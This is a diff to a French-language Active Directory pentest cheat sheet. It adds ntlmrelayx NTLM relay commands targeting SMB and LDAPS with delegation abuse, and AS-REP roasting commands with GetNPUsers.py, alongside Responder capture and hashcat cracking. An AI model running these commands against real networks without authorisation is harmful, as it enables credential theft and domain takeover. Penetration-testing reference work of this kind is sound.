@@ -34,6 +34,12 @@ sudo responder -I eth0 -wfv
 
 # Craquage des hashes capturés
 hashcat -m 5600 hashes.txt wordlist.txt
+
+# Configuration pour le relais NTLM (attaque plus avancée)
+sudo ntlmrelayx.py -t smb://192.168.1.10 -smb2support
+
+# Ou pour relayer vers LDAP/S afin d'obtenir plus de privilèges
+sudo ntlmrelayx.py -t ldaps://192.168.1.10 --delegate-access
 ```
 ### Exploitation des services web
 ```bash
@@ -85,7 +91,9 @@ Get-DomainObjectACL -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $sid}
 ### AS-REP Roasting
 ```bash
 # Identification des comptes sans pré-authentification Kerberos
-GetNPUsers.py domain.local/ -dc-ip 192.168.1.10 -request -format hashcat
+GetNPUsers.py domain.local/ -dc-ip 192.168.1.10 -request -format hashcat -usersfile users.txt
+# Ou pour tester tous les utilisateurs du domaine
+GetNPUsers.py domain.local/ -dc-ip 192.168.1.10 -request -format hashcat -no-pass
 
 # Craquage des hashes
 hashcat -m 18200 hashes.txt wordlist.txt
